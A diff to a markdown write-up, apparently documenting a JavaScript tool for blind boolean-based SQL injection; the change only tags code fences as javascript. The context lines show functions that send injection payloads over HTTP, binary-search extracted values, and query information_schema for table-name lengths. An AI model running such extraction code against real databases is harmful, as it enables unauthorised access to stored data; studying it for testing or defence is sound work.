@@ -48,7 +48,7 @@ export const makeRequest = config => {
 
 ## Boolean test with HTTP request
 
-```
+```javascript
 export const booleanTest = async (type, value, sqlQuery) => {
   let data = getPayload(type, value, sqlQuery) 
   let config = {
@@ -70,7 +70,7 @@ export const booleanTest = async (type, value, sqlQuery) => {
 ---
 
 ## Setting up injection string and the payload
-```
+```javascript
 export const getInjectionString = (type, value, sqlQuery) => {
   let comparison = ''
   if(type == 'min')
@@ -96,7 +96,7 @@ export const getPayload = (type, value, sqlQuery) => {
 ## Binary search
 
 The *binarySearch* method searches for the value in O(log(n)) time.
-```
+```javascript
 export const binarySearch = async (min, max, sqlQuery) => {
   while(min <= max) {
     let mid = Math.floor((min + max)/ 2)
@@ -116,7 +116,7 @@ export const binarySearch = async (min, max, sqlQuery) => {
 ## Confirm Value
 
 Confirms value tests for the value return by *binarySearch* and tests it with equality.
-```
+```javascript
 export const confirmValue = async (value, sqlQuery) => {
   // Confirm the retrieved value
   if(await booleanTest(true, value, sqlQuery)) {
@@ -130,7 +130,7 @@ export const confirmValue = async (value, sqlQuery) => {
 ```
 ---
 ## Passing SQL queries to `binarySearch` and `confirmValue`
-```
+```javascript
 const tableMaxLength = async () => {
   const sqlQuery = 'select max(char_length(table_name)) from information_schema.tables';
   let maxValue = await binarySearch(10, 64, sqlQuery)
